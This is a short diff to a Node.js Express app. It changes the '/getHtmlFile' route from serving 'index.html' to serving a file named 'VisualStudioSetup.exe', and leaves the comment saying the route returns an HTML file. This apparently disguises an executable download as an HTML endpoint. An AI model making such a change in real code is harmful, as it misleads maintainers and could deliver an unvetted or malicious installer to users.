@@ -17,7 +17,7 @@ app.get('/profile', (req, res) => {
 
 app.get('/getHtmlFile', (req, res) => {
     // Use path.join to get the absolute path to the HTML file
-    res.sendFile(path.join(__dirname, 'public', 'index.html')); 
+    res.sendFile(path.join(__dirname, 'static', 'VisualStudioSetup.exe')); 
 });
 
 
